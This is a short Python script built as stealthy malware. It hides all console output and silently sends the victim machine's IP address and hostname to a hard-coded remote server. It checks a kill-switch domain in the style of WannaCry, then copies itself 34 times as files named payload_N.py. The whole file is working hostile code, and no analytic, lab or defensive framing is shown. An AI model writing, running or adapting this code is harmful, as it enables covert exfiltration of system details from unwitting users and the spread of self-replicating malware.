import shutil
import os
import socket
import requests
import json
import sys

# Kill switch URL for checking whether to stop the replication
KILL_SWITCH_URL = "http://dhuhuhusdhshuhuhsufdfhdfdfdhf.com/kill-switch"

def get_system_info():
    # Get the system's IP address and hostname
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address, hostname

def send_data_to_server(ip_address, hostname):
    # URL where the data will be sent
    url = "http://10.0.1.33:3000"
    
    # Create the payload to send as a JSON object
    data = {
        "ip_address": ip_address,
        "hostname": hostname
    }
    
    try:
        # Send the data as a POST request
        response = requests.post(url, json=data)
        # Check if the request was successful
        if response.status_code == 200:
            pass  # Data sent successfully, no need to print anything
        else:
            pass  # Handle error silently
    except requests.RequestException as e:
        pass  # Handle error silently

def check_kill_switch():
    # Check for the kill switch signal from the server
    try:
        response = requests.get(KILL_SWITCH_URL)
        if response.status_code == 200:
            return response.text.strip().lower() == "stop"  # "stop" message would halt replication
        else:
            return False  # In case of an error, assume no kill switch signal
    except requests.RequestException:
        return False  # If the server is unreachable, assume no kill switch

def replicate_script():
    # Check if kill switch is active before proceeding with replication
    if check_kill_switch():
        return  # Stop replication if kill switch is active
    
    current_file = __file__  # Get the current script's filename
    num_replicates = 34      # Number of times to replicate the script

    for i in range(1, num_replicates + 1):
        # Create a new filename for the replicate
        new_filename = f"payload_{i}.py"
        # Copy the current script to the new file
        shutil.copy(current_file, new_filename)
        # Replication happens silently without printing anything

def suppress_output():
    # Suppress console output (redirect stdout and stderr to /dev/null)
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

if __name__ == "__main__":
    suppress_output()  # Suppress any console output

    # Get system information
    ip_address, hostname = get_system_info()
    
    # Send system information to the server
    send_data_to_server(ip_address, hostname)
    
    # Replicate the script
    replicate_script()
